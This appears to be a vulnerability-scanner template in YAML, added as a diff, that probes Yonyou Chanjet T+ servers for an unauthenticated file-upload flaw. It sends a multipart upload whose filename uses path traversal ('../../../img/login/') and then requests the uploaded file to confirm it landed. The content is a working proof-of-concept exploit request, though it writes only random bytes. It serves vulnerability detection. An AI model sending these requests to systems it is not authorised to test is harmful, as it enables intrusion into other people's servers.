@@ -1,0 +1,39 @@
+id: poc-yaml-yonyou-chanjet-file-upload
+
+info:
+  name: poc-yaml-yonyou-chanjet-file-upload
+  author: Jarcis-cy
+  severity: critical
+  tags: xray-converted,fileupload,ct-475791
+  reference:
+    - https://weibo.com/ttarticle/x/m/show/id/2309404807909669208397?_wb_client_=1
+
+http:
+  - raw:
+      - |
+        POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_base(8)}}
+
+        ------WebKitFormBoundary{{rand_base(8)}}
+        Content-Disposition: form-data; name="File1"; filename="../../../img/login/{{rand_base(8)}}.jpg"
+        Content-Type: image/jpeg
+        
+        {{rand_base(8)}}
+        ------WebKitFormBoundary{{rand_base(8)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /tplus/img/login/{{rand_base(8)}}.jpg HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
